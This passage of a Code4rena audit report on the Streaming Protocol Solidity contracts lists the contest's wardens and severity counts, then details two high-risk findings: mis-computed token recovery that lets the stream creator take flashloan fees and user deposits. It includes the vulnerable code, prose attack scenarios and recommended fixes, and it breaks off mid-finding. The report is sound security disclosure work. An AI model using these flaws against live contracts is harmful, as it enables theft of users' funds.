{
  "circa": {
    "title": "Streaming Protocol contest",
    "sponsor": "Streaming Protocol",
    "slug": "2021-11-streaming",
    "date": "2022-02-11",
    "findings": "https://github.com/code-423n4/2021-11-streaming-findings/issues",
    "contest": 62
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 code contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the code contest outlined in this document, C4 conducted an analysis of Streaming Protocol contest smart contract system written in Solidity. The code contest took place between November 30—December 7 2021.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>38 Wardens contributed reports to the Streaming Protocol contest:</p>\n<ol>\n<li><a href=\"https://twitter.com/hack3r_0m\">hack3r-0m</a></li>\n<li>bitbopper</li>\n<li>WatchPug (<a href=\"https://github.com/jack-the-pug\">jtp</a> and <a href=\"https://github.com/mingwatch\">ming</a>)</li>\n<li><a href=\"https://twitter.com/gpersoon\">gpersoon</a></li>\n<li>hyh</li>\n<li><a href=\"https://twitter.com/cyberboyIndia\">cyberboy</a></li>\n<li><a href=\"https://twitter.com/Meta0xNull\">Meta0xNull</a></li>\n<li><a href=\"https://twitter.com/KenzoAgada\">kenzo</a></li>\n<li>0x0x0x</li>\n<li>Jujic</li>\n<li>pedroais</li>\n<li><a href=\"https://twitter.com/cmichelio\">cmichel</a></li>\n<li><a href=\"https://twitter.com/defsec_\">defsec</a></li>\n<li><a href=\"https://twitter.com/gzeon\">gzeon</a></li>\n<li><a href=\"https://twitter.com/SolidityDev\">pauliax</a></li>\n<li><a href=\"https://twitter.com/GiveMeTestEther\">GiveMeTestEther</a></li>\n<li>GeekyLumberjack</li>\n<li>ScopeLift (<a href=\"https://github.com/wildmolasses\">wildmolasses</a>, <a href=\"https://twitter.com/BenDiFrancesco\">bendi</a>, and <a href=\"https://twitter.com/msolomon44/\">mds1</a>) </li>\n<li>harleythedog</li>\n<li>0x1f8b</li>\n<li><a href=\"https://twitter.com/0xruhum\">Ruhum</a></li>\n<li>hubble (ksk2345 and shri4net) </li>\n<li><a href=\"https://twitter.com/wuwe19\">wuwe1</a></li>\n<li><a href=\"https://twitter.com/itsmeSTYJ\">itsmeSTYJ</a></li>\n<li><a href=\"https://twitter.com/jonah1005w\">jonah1005</a></li>\n<li><a href=\"https://twitter.com/AshiqAmien\">toastedsteaksandwich</a></li>\n<li><a href=\"https://twitter.com/omikomikomik\">Omik</a></li>\n<li>jayjonah8</li>\n<li>egjlmn1</li>\n<li>robee</li>\n<li><a href=\"https://twitter.com/csanuragjain\">csanuragjain</a></li>\n<li>mtz</li>\n<li><a href=\"https://twitter.com/_ye0lde\">ye0lde</a></li>\n<li><a href=\"https://twitter.com/merkleplant_eth\">pmerkleplant</a></li>\n<li><a href=\"https://twitter.com/danbinnun\">danb</a></li>\n<li>pants</li>\n</ol>\n<p>This contest was judged by <a href=\"https://github.com/0xean\">0xean</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/itsmetechjay\">itsmetechjay</a> and <a href=\"https://twitter.com/CloudEllie1\">CloudEllie</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 42 unique vulnerabilities and 118 total findings. All of the issues presented here are linked back to their original finding.</p>\n<p>Of these vulnerabilities, 10 received a risk rating in the category of HIGH severity, 5 received a risk rating in the category of MEDIUM severity, and 27 received a risk rating in the category of LOW severity.</p>\n<p>C4 analysis also identified 23 non-critical recommendations and 53 gas optimizations.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2021-11-streaming\">C4 Streaming Protocol contest repository</a>, and is composed of 3 smart contracts written in the Solidity programming language and includes ~880 source lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities according to a methodology based on <a href=\"https://owasp.org/www-community/OWASP_Risk_Rating_Methodology\">OWASP standards</a>.</p>\n<p>Vulnerabilities are divided into three primary risk categories: high, medium, and low.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>Further information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code423n4.com\">the C4 website</a>.</p>\n<h1 id=\"high-risk-findings-10\" style=\"position:relative;\"><a href=\"#high-risk-findings-10\" aria-label=\"high risk findings 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (10)</h1>\n<h2 id=\"h-01-wrong-calculation-of-excess-deposittoken-allows-stream-creator-to-retrieve-deposittokenflashloanfeeamount-which-may-cause-fund-loss-to-users\" style=\"position:relative;\"><a href=\"#h-01-wrong-calculation-of-excess-deposittoken-allows-stream-creator-to-retrieve-deposittokenflashloanfeeamount-which-may-cause-fund-loss-to-users\" aria-label=\"h 01 wrong calculation of excess deposittoken allows stream creator to retrieve deposittokenflashloanfeeamount which may cause fund loss to users permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/241\">[H-01] Wrong calculation of excess depositToken allows stream creator to retrieve <code>depositTokenFlashloanFeeAmount</code>, which may cause fund loss to users</a></h2>\n<p><em>Submitted by WatchPug, also found by 0x0x0x, ScopeLift, gpersoon, harleythedog, hyh, gzeon, jonah1005, and kenzo</em></p>\n<p><a href=\"https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L654-L654\">https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L654-L654</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">excess</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) - (</span><span class=\"mtk12\">depositTokenAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">redeemedDepositTokens</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>In the current implementation, <code>depositTokenFlashloanFeeAmount</code> is not excluded when calculating <code>excess</code> depositToken. Therefore, the stream creator can call <code>recoverTokens(depositToken, recipient)</code> and retrieve <code>depositTokenFlashloanFeeAmount</code> if there are any.</p>\n<p>As a result:</p>\n<ul>\n<li>When the protocol <code>governance</code> calls <code>claimFees()</code> and claim accumulated <code>depositTokenFlashloanFeeAmount</code>, it may fail due to insufficient balance of depositToken.</li>\n<li>Or, part of users’ funds (depositToken) will be transferred to the protocol <code>governance</code> as fees, causing some users unable to withdraw or can only withdraw part of their deposits.</li>\n</ul>\n<h4 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<p>Given:</p>\n<ul>\n<li><code>feeEnabled</code>: true</li>\n<li><code>feePercent</code>: 10 (0.1%)</li>\n<li>Alice deposited <code>1,000,000</code> depositToken;</li>\n<li>Bob called <code>flashloan()</code> and borrowed <code>1,000,000</code> depositToken, then repaid <code>1,001,000</code>;</li>\n<li>Charlie deposited <code>1,000</code> depositToken;</li>\n<li>After <code>endDepositLock</code>, Alice called <code>claimDepositTokens()</code> and withdrawn <code>1,000,000</code> depositToken;</li>\n<li><code>streamCreator</code> called <code>recoverTokens(depositToken, recipient)</code> and retrieved <code>1,000</code> depositToken <code>(2,000 - (1,001,000 - 1,000,000))</code>;</li>\n<li><code>governance</code> called <code>claimFees()</code> and retrieved another <code>1,000</code> depositToken;</li>\n<li>Charlie tries to <code>claimDepositTokens()</code> but since the current balanceOf depositToken is <code>0</code>, the transcation always fails, and Charlie loses all the depositToken.</li>\n</ul>\n<h4 id=\"recommendation\" style=\"position:relative;\"><a href=\"#recommendation\" aria-label=\"recommendation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h4>\n<p>Change to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">excess</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) - (</span><span class=\"mtk12\">depositTokenAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">redeemedDepositTokens</span><span class=\"mtk1\">) - </span><span class=\"mtk12\">depositTokenFlashloanFeeAmount</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/241#issuecomment-989271468\">brockelmore (Streaming Protocol) confirmed</a></strong></p>\n<h2 id=\"h-02-tokens-can-be-stolen-when-deposittoken--rewardtoken\" style=\"position:relative;\"><a href=\"#h-02-tokens-can-be-stolen-when-deposittoken--rewardtoken\" aria-label=\"h 02 tokens can be stolen when deposittoken  rewardtoken permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/215\">[H-02] Tokens can be stolen when <code>depositToken == rewardToken</code></a></h2>\n<p><em>Submitted by cmichel, also found by 0x0x0x, gzeon, Ruhum, gpersoon, hack3r-0m, and pauliax</em></p>\n<p>The <code>Streaming</code> contract allows the <code>deposit</code> and <code>reward</code> tokens to be the same token.</p>\n<blockquote>\n<p>I believe this is intended, think Sushi reward on Sushi as is the case with <code>xSushi</code>.</p>\n</blockquote>\n<p>The reward and deposit balances are also correctly tracked independently in <code>depositTokenAmount</code> and <code>rewardTokenAmount</code>.\nHowever, when recovering tokens this leads to issues as the token is recovered twice, once for deposits and another time for rewards:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">recoverTokens</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">lock</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// NOTE: it is the stream creators responsibility to save</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// tokens on behalf of their users.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">streamCreator</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!creator&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">token</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">depositToken</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">endDepositLock</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;time&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// get the balance of this contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check what isnt claimable by either party</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// @audit-info depositTokenAmount updated on stake/withdraw/exit, redeemedDepositTokens increased on claimDepositTokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">excess</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) - (</span><span class=\"mtk12\">depositTokenAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">redeemedDepositTokens</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// allow saving of the token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">excess</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RecoveredTokens</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">excess</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">token</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">rewardToken</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">endRewardLock</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;time&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check current balance vs internal balance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// NOTE: if a token rebases, i.e. changes balance out from under us,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// most of this contract breaks and rugs depositors. this isn&#39;t exclusive</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// to this function but this function would in theory allow someone to rug</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// and recover the excess (if it is worth anything)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check what isnt claimable by depositors and governance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// @audit-info rewardTokenAmount increased on fundStream</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">excess</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) - (</span><span class=\"mtk12\">rewardTokenAmount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">rewardTokenFeeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">excess</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RecoveredTokens</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">excess</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// ...</span></span></span></code></pre>\n<h4 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h4>\n<p>Given <code>recoverTokens == depositToken</code>, <code>Stream</code> creator calls <code>recoverTokens(token = depositToken, creator)</code>.</p>\n<ul>\n<li>The <code>token</code> balance is the sum of deposited tokens (minus reclaimed) plus the reward token amount. <code>ERC20(token).balanceOf(address(this)) >= (depositTokenAmount - redeemedDepositTokens) + (rewardTokenAmount + rewardTokenFeeAmount)</code></li>\n<li><code>if (token == depositToken)</code> executes, the <code>excess</code> from the deposit amount will be the reward amount (<code>excess >= rewardTokenAmount + 